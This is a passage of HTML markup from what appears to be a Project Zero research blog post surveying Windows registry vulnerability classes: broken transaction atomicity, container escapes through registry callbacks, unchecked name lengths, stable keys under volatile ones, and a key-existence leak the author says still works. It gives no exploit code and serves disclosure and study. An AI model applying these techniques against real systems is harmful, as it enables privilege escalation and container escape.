Deputies&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;presentation from CONFidence 2024. &lt;/span&gt;&lt;span&gt;In many ways, this attack was a resurrection of a similar confused deputy problem, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://j00ru.vexillium.org/slides/2010/confidence.pdf&quot;&gt;CVE-2010-0237&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which I had discovered together with Gynvael Coldwind.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The main difference was that at that time, the redirection of access to keys was achieved via symbolic links&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;, a more obvious and widely known mechanism.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.jng7ke18thbs&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Atomicity of KTM transactions&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;T&lt;/span&gt;&lt;span&gt;he main feature of any transaction implementation is that it should guarantee atomicity &amp;ndash; that is, either apply all changes being part of the transaction, or none of them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Imagine my surprise then, when I discovered that the registry transaction implementation integrated with the KTM did not guarantee atomicity at all, but merely &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;tried really hard&lt;/span&gt;&lt;span&gt;&amp;nbsp;to maintain it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The main problem was that it wasn&amp;#39;t designed to handle OOM errors (for example, when a hive was completely full) and, as a result, when such a problem occurred in the middle of committing a transaction, there was no good way to reverse the changes already applied.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The Configuration Manager falsely returned a success code to the caller, while retrying to commit the remaining part of the transaction every 30 seconds, hoping that some space would free up in the registry &lt;/span&gt;&lt;span&gt;in the meantime, &lt;/span&gt;&lt;span&gt;and the operations would eventually succeed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This type of behavior obviously contradicted both the documentation and common sense about how transactions should work.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;I reported this issue as &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451576&quot;&gt;CVE-2023-32019&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and Microsoft fixed it by completely removing a large part of the code that implemented this functionality, as it was simply impossible to fix correctly without completely redesigning it from scratch.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Fortunately, in Windows 10, an alternative transaction implementation for the registry &lt;/span&gt;&lt;span&gt;ca&lt;/span&gt;&lt;span&gt;lled lightweight transactions was introduced, which was designed correctly and did not have the same problem.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a result, a decision was made to internally redirect the handling of KTM transactions within the Windows kernel to the same engine that is responsible for lightweight transactions.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.liv607q2hufy&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Containerized registry escapes&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The general goal of differencing hives and layered keys is to implement registry containerization.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This mechanism creates an isolated registry view for a specific group of processes, without direct access to the host registry (a sort of &amp;quot;chroot&amp;quot; for the Windows registry).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Unfortunately, there isn&amp;#39;t much official documentation on this topic, and it&amp;#39;s particularly difficult to find information on whether this type of containerization is a Microsoft-supported security boundary that warrants fixes in the monthly security bulletins.&lt;/span&gt;&lt;span&gt;&amp;nbsp;I think it is reasonable to expect that since the mechanism is used to isolate the registry in well supported use-cases (such as running&lt;/span&gt;&lt;span&gt;&amp;nbsp;Docker containers), it should ideally not be trivial to bypass, but I was unable to find any official statement &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;to support or refute this assumption.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;When I looked further into it, I discovered that the redirection of registry calls within containerized environments was managed by registry callbacks, specifically one called VrpRegistryCallback.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;While callbacks do indeed seem well suited for this purpose, the devil is in the details &amp;ndash; specifically, error handling.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I found at least two ways a containerized application could trigger an error during the execution of the internal VrpPreOpenOrCreate/VrpPostOpenOrCreate handlers.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This resulted in exiting the callback prematurely while an important part of the redirection logic still hadn&amp;#39;t been executed, and consequently led to the process gaining access to the host&amp;#39;s registry view.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, I found that another logical bug allowed access to the host&amp;#39;s registry through differencing hives associated with other active containers in the system.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As I mentioned, I wasn&amp;#39;t entirely clear on the state of Microsoft&amp;#39;s support for this mechanism, but luckily I didn&amp;#39;t have to wonder for too long.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It turned out that James Forshaw had a similar dilemma and managed to reach an understanding with the vendor on the matter, which he described &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/04/who-contains-containers.html&quot;&gt;in his blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;After much back and forth with various people in MSRC a decision was made. If a container escape works from a non-administrator user, basically if you can access resources outside of the container, then it would be considered a privilege escalation and therefore serviceable.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;Microsoft has not changed the MSRC servicing criteria at the time of writing. However, they will consider fixing any issue which on the surface seems to escape a Windows Server Container but doesnt require administrator privileges. It will be classed as an elevation of privilege.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Eventually&lt;/span&gt;&lt;span&gt;, I reported all three bugs in&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451611&quot;&gt;&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451611&quot;&gt;one report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and Microsoft fixed them shortly after as CVE-2023-36576.&lt;/span&gt;&lt;span&gt;&amp;nbsp;I particularly like t&lt;/span&gt;&lt;span&gt;he first issue described in the report&lt;/span&gt;&lt;span&gt;&amp;nbsp;(the bug in VrpBuildKeyPath), as it makes &lt;/span&gt;&lt;span&gt;a very interesting example of how a theoretically low-level issue like a 16-bit integer overflow can have the high-level consequences of a container escape, without any memory corruption being involved.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c11 ujDEXfwdRL-c46&quot; id=&quot;h.8nccxqb9ae9s&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Adherence to official key and value name length limits&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The constraints on the length of key and value names are quite simple.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Microsoft defines the maximum values on a dedicated documentation page called &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits&quot;&gt;Registry Element Size Limits&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ujDEXfwdRL-c33&quot;&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;Registry element&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c40&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;Size limit&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Key name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c40&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;255 characters. The key name includes the absolute path of the key in the registry, always starting at a base key, for example, HKEY_LOCAL_MACHINE.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c37&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Value name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c40&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span&gt;16,383 characters. &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Windows 2000:&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&amp;nbsp;260 ANSI characters or 16,383 Unicode characters.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Admittedly,&lt;/span&gt;&lt;span&gt;&amp;nbsp;the way this is worded is quite confusing, and I think it would be better if the information in the second column simply ended after the first period.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As it stands, the explanation for &amp;quot;key name&amp;quot; seems to suggest that the 255-character limit applies to the entire key path relative to the top-level key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;In reality, the limit of 255 (or to be precise, 256) characters applies to the individual name of each registry key, and value names are indeed limited to 16,383 characters. These&lt;/span&gt;&lt;span&gt;&amp;nbsp;assumptions are the basis for the entire registry code.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Despite these being fundamental and documented values, it might be surprising that the requirements weren&amp;#39;t correctly verified in the hive loading code until October 2022.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Specifically, it was possible to load a hive containing a key with a name of up to 1040 characters.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Furthermore&lt;/span&gt;&lt;span&gt;, the length of a value&amp;#39;s name wasn&amp;#39;t checked at all, meaning it could consist of up to 65535 characters, which is the maximum value of the uint16 type representing its length.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In both cases, it was possible to exceed the theoretical limits set by the documentation by more than four times.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;I reported these bugs as part of the&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451478&quot;&gt;&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451478&quot;&gt;CVE-2022-37991&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;report&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On a default Windows installation, I found a way to potentially exploit (or at least trigger a reproducible crash) the missing check for the value name&lt;/span&gt;&lt;span&gt;&amp;nbsp;length, but&lt;/span&gt;&lt;span&gt;&amp;nbsp;I couldn&amp;#39;t demonstrate the consequences of an overly long key name.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Nevertheless, I&amp;#39;m convinced that with a bit more research, one could find an application or driver implementing a registry callback that assumes key names cannot be longer than 255 characters, leading to a buffer overflow or other memory corruption.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This example clearly shows that even the official documentation cannot be trusted, and all assumptions, even the most fundamental ones, must be verified directly in the code during vulnerability research.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.99mt6bkq1orn&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Creation of stable keys under volatile ones&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Another rational behavior of the registry is that it doesn&amp;#39;t allow you to create Stable keys under Volatile parent keys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This makes sense, as stable keys are stored on disk and persist through hive unload and system reboot, whereas volatile keys only exist in memory and vanish when the hive is unloaded.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Consequently, a stable key under a volatile one wouldn&amp;#39;t be practical, as its parent would disappear after a restart, severing its path to the registry tree root, causing the stable key to disappear as well.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, under normal conditions, creating such a key is impossible, and any attempts to do so results in the &amp;nbsp;ERROR_CHILD_MUST_BE_VOLATILE error being returned to the caller.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;While there&amp;#39;s no official mention of this in the documentation (except for a &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--1000-1299-#ERROR_CHILD_MUST_BE_VOLATILE&quot;&gt;brief description&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the error code), Raymond Chen &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://devblogs.microsoft.com/oldnewthing/20170525-00/?p=96225&quot;&gt;addressed it&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;on his blog, providing at least some documentation of this behavior.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;During my research, I discovered two ways to bypass this requirement and create&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;stable keys under volatile ones.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These were &lt;/span&gt;&lt;span&gt;issues &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451512&quot;&gt;CVE-2023-21748&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/04_Transacted_stable_under_volatile_keys&quot;&gt;CVE-2024-26173&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, where the first one was related to registry virtualization, and the second to transaction support.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Interestingly, in both of these cases, it was clear that a certain invariant in the registry design was being broken, but it was less clear whether &lt;/span&gt;&lt;span&gt;this &lt;/span&gt;&lt;span&gt;could have any real consequences for system security.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;After spending some time on analysis, I came to the conclusion that there was at least a theoretical chance of some security impact, due to the fact that security descriptors of volatile keys are not linked together into a global linked list in the same way stable security descriptors are. &lt;/span&gt;&lt;span&gt;Long story short, if later in time some other stable keys in the hive started to share the security descriptor of the stable-under-volatile one, then their security would become invalidated and&lt;/span&gt;&lt;span&gt;&amp;nbsp;forcibly reset to their parent&amp;#39;s descriptor on the next system reboot, violating the security model of the registry. Microsoft apparently shared my assessment of the situation, as they decided to fix both bugs as part of a security bulletin.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Still&lt;/span&gt;&lt;span&gt;, this is an interesting illustration of the complexity of the registry &amp;ndash; sometimes finding an anomaly in the kernel logic can generate some kind of inconsistent state, but its implications might not be clear without further, detailed analysis.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.n1ydv39lyi32&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Arbitrary key existence information leak&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;If someone were to ask me whether an unprivileged user should be able to check for the existence of a registry key without having any access rights to that key or its parent in a secure operating system, I would say absolutely not.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, this is possible on Windows, because the code responsible for opening keys first performs a full path lookup, and only then checks the access rights.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This allows for differentiation between existing keys (return value STATUS_ACCESS_DENIED) and non-existing keys (return value STATUS_OBJECT_NAME_NOT_FOUND).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;After discovering this behavior, I decided to &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451657&quot;&gt;report it&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to Microsoft in December 2023.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The vendor&amp;#39;s response was that it is indeed a bug, but its severity is not high enough to be fixed as an official vulnerability.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I somewhat understand this interpretation, as the amount of information that can be disclosed in this way is quite low (&lt;/span&gt;&lt;span&gt;i.e. &lt;/span&gt;&lt;span&gt;limited configuration elements of other users), and fixing the issue would probably involve significant code refactoring and a potential performance decrease.&lt;/span&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span&gt;It&amp;#39;s also difficult to say whether this type of boundary is properly defensible, because after one fix it might turn out that there are many other ways to leak this type of information.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, the technique described in my report still works at the time of writing this blog post.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c11 ujDEXfwdRL-c48&quot; id=&quot;h.ju23lcqipdjt&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c25&quot;&gt;Miscellaneous&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In addition to the bug classes mentioned above, there are also many other types of issues that can occur in the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I certainly won&amp;#39;t be able to name them all, but briefly, here are a few more primitives that come to mind when I think about registry vulnerabilities:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_jxi7mn5ld7an-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Low-severity security bugs:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These include local DoS issues such as NULL pointer dereferences, infinite loops, direct KeBugCheckEx calls, as well as classic memory leaks, low-quality out-of-bounds reads, and others.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The details &lt;/span&gt;&lt;span&gt;of a number of such bugs can be found in the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs&quot;&gt;p0tools/WinRegLowSeverityBugs&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;repository on GitHub.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Real, but unexploitable bugs:&lt;/span&gt;&lt;span&gt;&amp;nbsp;These are bugs that are present in the code, but cannot be exploited due to some mitigating factors. Examples include bugs in the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/03_CmpComputeComponentHashes_nested_path_overflow&quot;&gt;CmpComputeComponentHashes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/18_HvCheckBin_incorrect_return_value&quot;&gt;HvCheckBin&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;internal &lt;/span&gt;&lt;span&gt;functions&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Memory management bugs:&lt;/span&gt;&lt;span&gt;&amp;nbsp;These bugs are specifically related to &lt;/span&gt;&lt;span&gt;the management of &lt;/span&gt;&lt;span&gt;hive&lt;/span&gt;&lt;span&gt;&amp;nbsp;section views in the context of the Registry process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;This especially&lt;/span&gt;&lt;span&gt;&amp;nbsp;applies to situations where the hive is loaded from a file on a removable drive, from a remote SMB share, or from a file on a local disk but with unusual semantics (e.g., a placeholder file created through the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/&quot;&gt;Cloud Filter API&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). Two examples of this vulnerability type are &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451731&quot;&gt;CVE-2024-43452&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451734&quot;&gt;CVE-2024-49114&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;Unusual primitives:&lt;/span&gt;&lt;span&gt;&amp;nbsp;These are various non standard primitives that are simply too difficult to categorize, such as &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/12_CmpUndoDeleteKeyForTrans_unsafe_behavior&quot;&gt;CVE-2024-26177&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion&quot;&gt;CVE-2024-26178&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/19_VrpRegistryCallback_unhandled_key_rename&quot;&gt;WinRegLowSeverityBugs #19&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;or &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a 